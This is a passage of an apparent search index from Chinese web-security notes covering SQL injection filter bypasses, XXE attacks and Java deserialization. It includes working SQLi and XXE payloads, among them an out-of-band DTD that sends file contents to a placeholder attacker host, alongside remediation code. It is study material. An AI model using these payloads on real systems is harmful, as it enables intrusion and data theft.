\u66ff\u6362 group_concat \u53ef\u4ee5\u4f7f\u7528 concat_ws()\u66ff\u6362 \u7528 /**/ \uff0c <> \u6765**\u5206\u5272\u5173\u952e\u5b57** sel<>ect sel/**/ect","title":"\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u8fc7\u6ee4\u4e86SQL\u5173\u952e\u8bcd"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_22","text":"**16\u8fdb\u5236\u7f16\u7801**\u7ed5\u8fc7\uff1a select * from test where username='admin'; select * from test where username=\"admin\"; \u5f53\u5f15\u53f7\u88ab\u8fc7\u6ee4\u4e86\u7684\u8bdd\uff0c 'admin' \u6216\u8005 \"admin\" \u5c31\u6ca1\u6cd5\u7528\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 admin \u768416\u8fdb\u5236 0x61646d696e \u4ee3\u66ff select*from users where username=0x61646d696e; \u6ce8\uff1a\u4e2d\u6587\u65e0\u6cd5\u4f7f\u752816\u8fdb\u5236\u7f16\u7801\u7ed5\u8fc7 **ASCII\u7f16\u7801**\u7ed5\u8fc7\uff1a admin\u7684\u5404\u4e2a\u5b57\u7b26\u7684ascii\u503c\u4e3a\uff1a97-100-109-105-110 \u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528concat(char(97),char(100),char(109),char(105),char(110)) \u6765\u4ee3\u66ffadmin **URL\u7f16\u7801**\u7ed5\u8fc7(\u6709\u6761\u4ef6)\uff1a \u524d\u63d0\u5c31\u662f\uff0c\u540e\u7aef\u5728\u5904\u7406\u63a5\u6536\u7684\u53c2\u6570\u65f6\u5bf9\u8be5\u53c2\u6570\u8fdb\u884c\u4e86URL\u89e3\u7801\uff0c\u5e76\u4e14\u8be5URL\u89e3\u7801\u662f\u5728\u8fc7\u6ee4\u51fd\u6570\u4e4b\u540e\u624d\u53ef\u4ee5\u3002 $username=$_GET['username']; $username=blacklist($username); #\u8fc7\u6ee4\u51fd\u6570 $username=urldecode($username); #URL\u89e3\u7801 \u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 \" \u7684 URL\u7f16\u7801 \u7684 URL\u7f16\u7801 \uff0c\u4e5f\u5c31\u662f %2522 \u5728Sqlmap\u4e2d\uff0c\u5bf9payload\u8fdb\u884cURL\u7f16\u7801\u7684\u811a\u672c\u662f\uff1acharencode.py(URL\u7f16\u7801) \u3001chardoubleencode.py(\u4e24\u6b21URL\u7f16\u7801)","title":"\u8fc7\u6ee4\u4e86\u5f15\u53f7"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_23","text":"\u7b80\u5355\u6ce8\u5165\u53ef\u4ee5\u4f7f\u7528**join\u65b9\u6cd5**\u7ed5\u8fc7 union select 1,2,3 union select * from (select 1)a join (select 2)b join (select 3) \u5bf9\u4e8esubstr\u3001substring() \u548c mid() \u8fd9\u4e24\u4e2a\u51fd\u6570\u53ef\u4ee5\u4f7f\u7528**from for**\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7 // substr() \u9017\u53f7\u7ed5\u8fc7 select * from test where id=1 and (select ascii(substr(username,2,1)) from admin limit 1)>97; select * from test where id=1 and (select ascii(substr(username from 2 for 1))from admin limit 1)>97; // substring() \u9017\u53f7\u7ed5\u8fc7 select * from test where id=1 and (select ascii(substring(username,2,1)) from admin limit 1)>97; select * from test where id=1 and (select ascii(substring(username from 2 for 1))from admin limit 1)>97; // mid() \u9017\u53f7\u7ed5\u8fc7 select * from test where id=1 and (select ascii(mid(username,2,1)) from admin limit 1)>97; select * from test where id=1 and (select ascii(mid(username from 2 for 1))from admin limit 1)>97; \u5bf9\u4e8elimit \uff0c\u53ef\u4ee5\u7528 offset \u7ed5\u8fc7 // limit \u9017\u53f7\u7ed5\u8fc7 select * from test where id=1 limit 1,2; select * from test where id=1 limit 2 offset 1;","title":"\u8fc7\u6ee4\u4e86\u9017\u53f7"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_24","text":"\u4f7f\u7528\u5230 **greatest()\u548cleast()**\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002greatest()\u8fd4\u56de\u6700\u5927\u503c\uff0cleast()\u8fd4\u56de\u6700\u5c0f\u503c select * from users where id=1 and ascii(substring(database(),0,1))>64; select * from users where id=1 and greatest(ascii(substring(database(),0,1)),64)>64; select * from users where id=1 and ascii(substring(database(),0,1))<64; select * from users where id=1 and least(ascii(substring(database(),0,1)),64)<64; \u5728Sqlmap\u4e2d\uff0c\u7528greatest\u4ee3\u66ff\u5927\u4e8e\u53f7\u7684\u811a\u672c\u662f\uff1agreatest.py \u4f7f\u7528**strcmp(str1,str2)**\u7ed5\u8fc7\uff1a\u5f53str1=str2\uff0c\u8fd4\u56de0\uff0c\u5f53str1>str2\uff0c\u8fd4\u56de1\uff0c\u5f53str1<str2\uff0c\u8fd4\u56de-1 \u4f7f\u7528**in\u64cd\u4f5c\u7b26**\u7ed5\u8fc7\uff1a \u4f7f\u7528**between and**\u6765\u7ed5\u8fc7\uff1a\u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u7684\u6570\u636e\u8303\u56f4\u3002\u8fd9\u4e9b\u503c\u53ef\u4ee5\u662f\u6570\u503c\u3001\u6587\u672c\u6216\u8005\u65e5\u671f","title":"\u8fc7\u6ee4\u4e86\u6bd4\u8f83\u7b26&lt; &gt;"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#or-and-xor-not","text":"and\u7528 && \u4ee3\u66ff or\u7528 || \u4ee3\u66ff xor\u7528 | \u4ee3\u66ff not\u7528 ! \u4ee3\u66ff select * from users where id=1 and 1=2; select * from users where id=1 && 1=2\uff1b select * from users where id=1 or 1=2; select * from users where id=1 || 1=2;","title":"\u8fc7\u6ee4\u4e86 or and xor not"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_25","text":"\u5982\u679c\u8fc7\u6ee4\u4e86#\uff0c\u5219\u53ef\u4ee5\u5229\u7528 ||' \u6765\u7ed5\u8fc7\u3002\u4f46\u662f\u8fd9\u4e2a\u53ea\u9650\u4e8e\u95ed\u5408\u540e\u9762\u662f\u5355\u5f15\u53f7\u8fd9\u79cd\u60c5\u5f62 select * from users where id='1' and 1=1#' limit 0,1 select * from users where id='1' and 1=1||'' limit 0,1 \u5982\u679c\u662f\u6570\u5b57\u578b\u6ce8\u5165\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5c31\u4e0d\u594f\u6548 \u6216\u8005\u662f**\u653e\u5f03\u6ce8\u91ca\u540e\u9762\u5185\u5bb9**\uff0c\u624b\u52a8\u62fc\u63a5 -1' union select 1,2,3 and '1'='1 SELECT * FROM users WHERE id='-1' union select 1,2,3 and '1'='1' LIMIT 0,1","title":"\u8fc7\u6ee4\u4e86\u6ce8\u91ca\u7b26"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_26","text":"\u4f7f\u7528 like\u3001rlike\u3001regexp like\uff1a\u5c31\u662f\u7b49\u4e8e\u7684\u610f\u601d rlike\uff1a\u5c31\u662f**\u91cc\u9762\u5305\u542b**\u6709\u8fd9\u4e2a regexp\uff1a\u548crlike\u4e00\u6837\uff0c**\u91cc\u9762\u5305\u542b**\u6709\u5373\u53ef \u5728Sqlmap\u4e2d\uff0c\u7528like\u4ee3\u66ff=\u53f7\u7684\u811a\u672c\u662f\uff1aequaltolike.py","title":"\u8fc7\u6ee4\u4e86="},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#http","text":"\u4ee3\u7801\u53ea\u9a8c\u8bc1\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570id\u7684\u5408\u6cd5\u6027 \u4f46\u662f $_GET \u662f\u4ece\u540e\u5f80\u524d\u53d6\u503c\u7684\uff0c $_GET['id'] \u662f\u53d6GET\u4f20\u9012\u7684**\u6700\u540e\u4e00\u4e2a**\u540d\u79f0\u4e3aid\u7684\u503c http://localhost/sqli/Less-29/login.php?id=1&id=-1' union select 1,2,3 -- - \u7b2c\u4e8c\u4e2aid\u53c2\u6570\u901a\u8fc7 $_GET \u4f20\u9012\u9020\u6210sql\u6ce8\u5165","title":"HTTP\u53c2\u6570\u6c61\u67d3\u7ed5\u8fc7"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/","text":"XXE\u6f0f\u6d1e \u00b6 XXE\u6f0f\u6d1e\u4ecb\u7ecd \u00b6 XXE\u6f0f\u6d1e\u5168\u79f0\u662fXML External Entity Injection\uff0c\u5373xml\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u3002 XXE\u6f0f\u6d1e\u53d1\u751f\u5728\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML\u8f93\u5165\u65f6\uff0c\u6ca1\u6709\u7981\u6b62\u5916\u90e8\u5b9e\u4f53\u7684\u52a0\u8f7d\uff0c\u5bfc\u81f4\u53ef\u52a0\u8f7d\u6076\u610f\u5916\u90e8\u6587\u4ef6\uff0c\u9020\u6210\u6587\u4ef6\u8bfb\u53d6\u3001\u547d\u4ee4\u6267\u884c\u3001\u5185\u7f51\u653b\u51fb\u7b49\u5371\u5bb3\u3002 XML\u88ab\u7528\u6765\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e\uff0c\u5173\u6ce8\u6570\u636e\u7684\u5185\u5bb9\uff1b\u800cHTML\u88ab\u7528\u6765\u663e\u793a\u6570\u636e\uff0c\u5173\u6ce8\u6570\u636e\u7684\u5916\u89c2\u3002 libxml2.9.1\u53ca\u4ee5\u540e\u9ed8\u8ba4\u4e0d\u5728\u89e3\u6790\u5916\u90e8\u5b9e\u4f53\u3002 \u73a9\u6cd5 \u00b6 \u6709\u56de\u663e\u8bfb\u6587\u4ef6 \u00b6 <?xml version = \"1.0\"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"file:///d://key.txt\"> ]> <x> &xxe; </x> \u5f15\u7528\u5916\u90e8\u5b9e\u4f53dtd\u6709\u56de\u663e \u00b6 <?xml version=\"1.0\"?> <!DOCTYPE test [ <!ENTITY % file SYSTEM \"http://\u6076\u610f\u5730\u5740/evil.dtd\"> %file; ]> <x> &send; </x> \u5176\u4e2devil.dtd\u5185\u5bb9\u4e3a <!ENTITY send SYSTEM \"file:///d:/key.txt\"> \u65e0\u56de\u663e\u8bfb\u6587\u4ef6 \u00b6 <?xml version=\"1.0\"?> <!DOCTYPE test [ <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=d:/key.txt\"> <!ENTITY % dtd SYSTEM \"http://\u6076\u610f\u5730\u5740/test.dtd\"> %dtd; %send; ]> \u5176\u4e2d\u9ed1\u5ba2\u670d\u52a1\u5668\u4e0atest.dtd\u5185\u5bb9\u4e3a <!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://\u6076\u610f\u5730\u5740/?data=%file;'> \"> %payload; \u628a\u8bfb\u5230\u7684key.txt\u4f7f\u7528base64\u7f16\u7801\u5b58\u5230file\u53d8\u91cf\u4e2d\uff0c\u8bf7\u6c42\u6076\u610f\u7f51\u7ad9\u7684test.dtd\u5e76\u6267\u884c\uff0c\u521b\u5efa\u4e00\u6b21\u8bf7\u6c42\u5e76\u643a\u5e26\u4e0afile\u5185\u5bb9 \u53ef\u4ee5\u4f7f\u7528nc\u76d1\u542c\u8bf7\u6c42\u6216\u8005\u67e5\u770bapache\u65e5\u5fd7\u5f97\u5230file\u7684\u5185\u5bb9 \u6216\u8005\u4f7f\u7528php\u56de\u663edata\u53c2\u6570 <?php $file = \"./test.txt\" ; $content = base64_decode ( $_GET [ 'data' ]); file_puts_content ( $file , $content ); echo \" \\n \" ; ?> \u5185\u7f51\u63a2\u6d4b \u00b6 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY rabbit SYSTEM \"http://\u5185\u7f51IP/key.txt\"> ]> <x> &rabbit; </x> RCE \u00b6 \u5728\u5b89\u88c5expect\u6269\u5c55\u7684php\u73af\u5883\u91cc\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 <?xml version = \"1.0\"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"expect://id\"> ]> <x> &xxe; </x> \u534f\u8bae\u8bfb\u6587\u4ef6\uff08\u7ed5\u8fc7file\u534f\u8bae\u9650\u5236\uff09 \u00b6 <?xml version=\"1.0\"?> <!DOCTYPE ANY [ <!ENTITY f SYSTEM \"php://filter/read=convert.base64-encode/resource=xxe.php\"> ]> <x> &f; </x> \u53d1\u73b0XXE \u00b6 \u63d0\u4ea4\u7684POST\u6570\u636e\u5f62\u5f0f\u7c7b\u4f3c\u4e8e\uff1a <user>admin</user><password>123456</password> Content-Type\u503c\u4e3a\uff1atext/xml\u6216\u8005\u662fapplication/xml \u53c8\u6216\u662f\u867d\u7136Content-Type\u4e0d\u662fxml\uff0c\u4f46\u662f\u6293\u5305\u624b\u52a8\u6539\u6210text/xml\u4e0d\u62a5\u9519\uff0c\u8bf4\u660e\u4e5f\u80fd\u63a5\u53d7xml \u5047\u8bbe\u8fd9\u662f\u4e00\u4e2a XXE \u65e0\u56de\u663e\u7684\u6f0f\u6d1e\uff0c\u6216\u8005\u8bf4\u4e0d\u6e05\u695a\u670d\u52a1\u5668\u662f\u4ec0\u4e48\u64cd\u4f5c\u7cfb\u7edf\u3001\u4e0d\u6e05\u695a\u6587\u4ef6\u7ec4\u6210\uff0c\u53ef\u4ee5\u6784\u9020\u5982\u4e0b DNSlog \u76f8\u5173\u7684 Payload\uff1a <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://111.4s1b2n.dnslog.cn\" > ]> <foo> &xxe; </foo> \u5728dnslog\u7f51\u7ad9\u770b\u5230\u6709\u8bf7\u6c42\u8fc7\u6765\u4e86\uff0c\u8bf4\u660e\u5b58\u5728xxe\u6f0f\u6d1e XXE\u81ea\u52a8\u5316\u6ce8\u5165\u5de5\u5177 \u00b6 XXEinjector\uff0c\u9700\u8981\u914d\u7f6eRuby\u73af\u5883\uff0c\u5efa\u8bae\u4f7f\u7528Ninjutsu v3\u5fcd\u8005\u865a\u62df\u673a XXE\u4fee\u590d\u65b9\u6848 \u00b6 PHP\u7981\u7528\u5916\u90e8\u5b9e\u4f53 \u00b6 libxml_disable_entity_loader(true); Java\u7981\u7528\u5916\u90e8\u5b9e\u4f53 \u00b6 DocumentBuilderFactory dbf = DocumentBuilderFactory . newInstance (); dbf . setExpandEntityReferences ( false ); Python\u7981\u7528\u5916\u90e8\u5b9e\u4f53 \u00b6 from lxml import etree xmlData = etree . parse ( xmlSource , etree . XMLParser ( resolve_entities = False )) \u8fc7\u6ee4\u7528\u6237\u63d0\u4ea4\u7684XML\u6570\u636e \u00b6 \u8fc7\u6ee4\u5173\u952e\u8bcd<!DOCTYPE\u548c<!ENTITY\uff0c\u6216\u8005SYSTEM\u548cPUBLIC \u9884\u5b9a\u4e49\u5b57\u7b26\u8f6c\u4e49 \u00b6 < &lt; > &gt; & &amp; ' &apos; \" &quot; XML\u6570\u636e\u63a5\u53d7\u534f\u8bae \u00b6 libxml2\uff1afile\u3001http\u3001ftp PHP\uff1afile\u3001http\u3001ftp\u3001php\u3001data\u3001glob\u3001phar\u3001compress.zlib\u3001compress.bzip2 Java\uff1ahttp\u3001https\u3001ftp\u3001file\u3001jar\u3001netdoc\u3001mailto\u3001gopher .NET\uff1afile\u3001http\u3001https\u3001ftp","title":"XXE\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#xxe","text":"","title":"XXE\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#xxe_1","text":"XXE\u6f0f\u6d1e\u5168\u79f0\u662fXML External Entity Injection\uff0c\u5373xml\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u3002 XXE\u6f0f\u6d1e\u53d1\u751f\u5728\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML\u8f93\u5165\u65f6\uff0c\u6ca1\u6709\u7981\u6b62\u5916\u90e8\u5b9e\u4f53\u7684\u52a0\u8f7d\uff0c\u5bfc\u81f4\u53ef\u52a0\u8f7d\u6076\u610f\u5916\u90e8\u6587\u4ef6\uff0c\u9020\u6210\u6587\u4ef6\u8bfb\u53d6\u3001\u547d\u4ee4\u6267\u884c\u3001\u5185\u7f51\u653b\u51fb\u7b49\u5371\u5bb3\u3002 XML\u88ab\u7528\u6765\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e\uff0c\u5173\u6ce8\u6570\u636e\u7684\u5185\u5bb9\uff1b\u800cHTML\u88ab\u7528\u6765\u663e\u793a\u6570\u636e\uff0c\u5173\u6ce8\u6570\u636e\u7684\u5916\u89c2\u3002 libxml2.9.1\u53ca\u4ee5\u540e\u9ed8\u8ba4\u4e0d\u5728\u89e3\u6790\u5916\u90e8\u5b9e\u4f53\u3002","title":"XXE\u6f0f\u6d1e\u4ecb\u7ecd"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#_1","text":"","title":"\u73a9\u6cd5"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#_2","text":"<?xml version = \"1.0\"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"file:///d://key.txt\"> ]> <x> &xxe; </x>","title":"\u6709\u56de\u663e\u8bfb\u6587\u4ef6"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#dtd","text":"<?xml version=\"1.0\"?> <!DOCTYPE test [ <!ENTITY % file SYSTEM \"http://\u6076\u610f\u5730\u5740/evil.dtd\"> %file; ]> <x> &send; </x> \u5176\u4e2devil.dtd\u5185\u5bb9\u4e3a <!ENTITY send SYSTEM \"file:///d:/key.txt\">","title":"\u5f15\u7528\u5916\u90e8\u5b9e\u4f53dtd\u6709\u56de\u663e"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#_3","text":"<?xml version=\"1.0\"?> <!DOCTYPE test [ <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=d:/key.txt\"> <!ENTITY % dtd SYSTEM \"http://\u6076\u610f\u5730\u5740/test.dtd\"> %dtd; %send; ]> \u5176\u4e2d\u9ed1\u5ba2\u670d\u52a1\u5668\u4e0atest.dtd\u5185\u5bb9\u4e3a <!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://\u6076\u610f\u5730\u5740/?data=%file;'> \"> %payload; \u628a\u8bfb\u5230\u7684key.txt\u4f7f\u7528base64\u7f16\u7801\u5b58\u5230file\u53d8\u91cf\u4e2d\uff0c\u8bf7\u6c42\u6076\u610f\u7f51\u7ad9\u7684test.dtd\u5e76\u6267\u884c\uff0c\u521b\u5efa\u4e00\u6b21\u8bf7\u6c42\u5e76\u643a\u5e26\u4e0afile\u5185\u5bb9 \u53ef\u4ee5\u4f7f\u7528nc\u76d1\u542c\u8bf7\u6c42\u6216\u8005\u67e5\u770bapache\u65e5\u5fd7\u5f97\u5230file\u7684\u5185\u5bb9 \u6216\u8005\u4f7f\u7528php\u56de\u663edata\u53c2\u6570 <?php $file = \"./test.txt\" ; $content = base64_decode ( $_GET [ 'data' ]); file_puts_content ( $file , $content ); echo \" \\n \" ; ?>","title":"\u65e0\u56de\u663e\u8bfb\u6587\u4ef6"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#_4","text":"<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY rabbit SYSTEM \"http://\u5185\u7f51IP/key.txt\"> ]> <x> &rabbit; </x>","title":"\u5185\u7f51\u63a2\u6d4b"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#rce","text":"\u5728\u5b89\u88c5expect\u6269\u5c55\u7684php\u73af\u5883\u91cc\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 <?xml version = \"1.0\"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"expect://id\"> ]> <x> &xxe; </x>","title":"RCE"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#file","text":"<?xml version=\"1.0\"?> <!DOCTYPE ANY [ <!ENTITY f SYSTEM \"php://filter/read=convert.base64-encode/resource=xxe.php\"> ]> <x> &f; </x>","title":"\u534f\u8bae\u8bfb\u6587\u4ef6\uff08\u7ed5\u8fc7file\u534f\u8bae\u9650\u5236\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#xxe_2","text":"\u63d0\u4ea4\u7684POST\u6570\u636e\u5f62\u5f0f\u7c7b\u4f3c\u4e8e\uff1a <user>admin</user><password>123456</password> Content-Type\u503c\u4e3a\uff1atext/xml\u6216\u8005\u662fapplication/xml \u53c8\u6216\u662f\u867d\u7136Content-Type\u4e0d\u662fxml\uff0c\u4f46\u662f\u6293\u5305\u624b\u52a8\u6539\u6210text/xml\u4e0d\u62a5\u9519\uff0c\u8bf4\u660e\u4e5f\u80fd\u63a5\u53d7xml \u5047\u8bbe\u8fd9\u662f\u4e00\u4e2a XXE \u65e0\u56de\u663e\u7684\u6f0f\u6d1e\uff0c\u6216\u8005\u8bf4\u4e0d\u6e05\u695a\u670d\u52a1\u5668\u662f\u4ec0\u4e48\u64cd\u4f5c\u7cfb\u7edf\u3001\u4e0d\u6e05\u695a\u6587\u4ef6\u7ec4\u6210\uff0c\u53ef\u4ee5\u6784\u9020\u5982\u4e0b DNSlog \u76f8\u5173\u7684 Payload\uff1a <?xml version=\"1.0\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://111.4s1b2n.dnslog.cn\" > ]> <foo> &xxe; </foo> \u5728dnslog\u7f51\u7ad9\u770b\u5230\u6709\u8bf7\u6c42\u8fc7\u6765\u4e86\uff0c\u8bf4\u660e\u5b58\u5728xxe\u6f0f\u6d1e","title":"\u53d1\u73b0XXE"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#xxe_3","text":"XXEinjector\uff0c\u9700\u8981\u914d\u7f6eRuby\u73af\u5883\uff0c\u5efa\u8bae\u4f7f\u7528Ninjutsu v3\u5fcd\u8005\u865a\u62df\u673a","title":"XXE\u81ea\u52a8\u5316\u6ce8\u5165\u5de5\u5177"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#xxe_4","text":"","title":"XXE\u4fee\u590d\u65b9\u6848"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#php","text":"libxml_disable_entity_loader(true);","title":"PHP\u7981\u7528\u5916\u90e8\u5b9e\u4f53"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#java","text":"DocumentBuilderFactory dbf = DocumentBuilderFactory . newInstance (); dbf . setExpandEntityReferences ( false );","title":"Java\u7981\u7528\u5916\u90e8\u5b9e\u4f53"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#python","text":"from lxml import etree xmlData = etree . parse ( xmlSource , etree . XMLParser ( resolve_entities = False ))","title":"Python\u7981\u7528\u5916\u90e8\u5b9e\u4f53"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#xml","text":"\u8fc7\u6ee4\u5173\u952e\u8bcd<!DOCTYPE\u548c<!ENTITY\uff0c\u6216\u8005SYSTEM\u548cPUBLIC","title":"\u8fc7\u6ee4\u7528\u6237\u63d0\u4ea4\u7684XML\u6570\u636e"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#_5","text":"< &lt; > &gt; & &amp; ' &apos; \" &quot;","title":"\u9884\u5b9a\u4e49\u5b57\u7b26\u8f6c\u4e49"},{"location":"Web%E5%AE%89%E5%85%A8/XXE/XXE%E6%BC%8F%E6%B4%9E/#xml_1","text":"libxml2\uff1afile\u3001http\u3001ftp PHP\uff1afile\u3001http\u3001ftp\u3001php\u3001data\u3001glob\u3001phar\u3001compress.zlib\u3001compress.bzip2 Java\uff1ahttp\u3001https\u3001ftp\u3001file\u3001jar\u3001netdoc\u3001mailto\u3001gopher .NET\uff1afile\u3001http\u3001https\u3001ftp","title":"XML\u6570\u636e\u63a5\u53d7\u534f\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"Java\u53cd\u5e8f\u5217\u5316 \u00b6 \u4ec0\u4e48\u662fJava\u5e8f\u5217\u5316 \u00b6 Java \u5e8f\u5217\u5316\u662f\u6307\u628a Java \u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u8282\u5e8f\u5217\u7684\u8fc7\u7a0b\u3002 Java \u53cd\u5e8f\u5217\u5316\u662f\u6307\u628a\u5b57\u8282\u5e8f\u5217\u6062\u590d\u4e3a Java \u5bf9\u8c61\u7684\u8fc7\u7a0b\u3002 \u5b9e\u73b0 \u00b6 \u4f7f\u7528\u5230JDK\u4e2d\u5173\u952e\u7c7b ObjectOutputStream (\u5bf9\u8c61\u8f93\u51fa\u6d41) \u548c**ObjectInputStream**(\u5bf9\u8c61\u8f93\u5165\u6d41) ObjectOutputStream \u7c7b\u4e2d\uff1a\u901a\u8fc7\u4f7f\u7528 writeObject(Object object) \u65b9\u6cd5\uff0c\u5c06\u5bf9\u8c61\u4ee5\u4e8c\u8fdb\u5236\u683c\u5f0f\u8fdb\u884c\u5199\u5165\u3002 ObjectInputStream \u7c7b\u4e2d\uff1a\u901a\u8fc7\u4f7f\u7528 readObject()\u65b9\u6cd5\uff0c\u4ece\u8f93\u5165\u6d41\u4e2d\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6d41\uff0c\u8f6c\u6362\u6210\u5bf9\u8c61\u3002 import java.io.* ; public class main { main () { } //\u5e8f\u5217\u5316\u51fd\u6570 public static byte [] serialize ( Object obj ) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( baos ); oos . writeObject ( obj ); return baos . toByteArray (); } //\u53cd\u5e8f\u5217\u5316\u51fd\u6570 public static Object unserialize ( byte [] bytes ) throws IOException , ClassNotFoundException { var ois = new ObjectInputStream ( new ByteArrayInputStream ( bytes )); return ois . readObject (); } } \u6ce8\uff1a\u53ea\u6709\u5b9e\u73b0Serializable\u63a5\u53e3\u7684\u7c7b\u624d\u53ef\u4ee5\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u4e0e\u5e8f\u5217\u5316 \u5229\u7528 \u00b6 \u6838\u5fc3Controller\uff1a @ResponseBody @RequestMapping ({ \"/\" }) public String index ( HttpServletRequest request , HttpServletResponse response , @RequestParam String name ) throws Exception { Cookie [] cookies = request . getCookies (); //\u83b7\u53d6\u8bf7\u6c42\u7684\u6240\u6709cookie boolean exist = false ; Cookie cookie = null ; User user = null ; User . name = request . getParameter ( \"name\" ); if ( cookies != null ) { Cookie [] var8 = cookies ; int var9 = cookies . length ; for ( int var10 = 0 ; var10 < var9 ; ++ var10 ) { //\u627e\u5230key\u503c\u4e3auser\u7684cookie Cookie c = var8 [ var10 ] ; if ( c . getName (). equals ( \"user\" )) { exist = true ; cookie = c ; break ; } } } if ( exist ) { byte [] bytes = Tools . base64Decode ( cookie . getValue ()); //\u83b7\u53d6key\u503c\u4e3auser\u7684cookie\u7684\u503c\u8fdb\u884cbase64\u89e3\u7801 try { user = ( User ) Tools . deserialize ( bytes ); //**\u53cd\u5e8f\u5217\u5316** } catch ( Exception e ) { e . printStackTrace (); } } else { user = new User (); user . setId ( 1 ); user . setName ( \"admin\" ); try { cookie = new Cookie ( \"user\" , Tools . base64Encode ( Tools . serialize ( user ))); } catch ( Exception e ) { e . printStackTrace (); } response . addCookie ( cookie ); } request . setAttribute ( \"user\" , user ); return user . getName (); } \u627e\u5230\u8bf7\u6c42\u4e2dkey\u503c\u4e3a user \u7684cookie\uff0c \u7136\u540e\u5c31\u884cbase64\u89e3\u7801\u7136\u540e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c \u5982\u679c\u6ca1\u6709\u8fd9\u6837\u7684cookie\u5c31\u65b0\u751f\u6210\u4e00\u4e2a\u7136\u540e\u8fd4\u56de name \u5c5e\u6027\u7684\u503c\u3002\u53cd\u5e8f\u5217\u5316\u7684\u70b9\u5c31\u662f\u52a0\u661f\u53f7\uff08*\uff09\u7684\u4ee3\u7801\uff0c \u6211\u4eec\u9700\u8981\u4f2a\u9020cookie\uff0c\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u7684\u70b9\u3002 User\u7c7b\uff1a public class User implements Serializable { private static final long serialVersionUID = 1L ; public static String name ; private String wh1speryyds ; 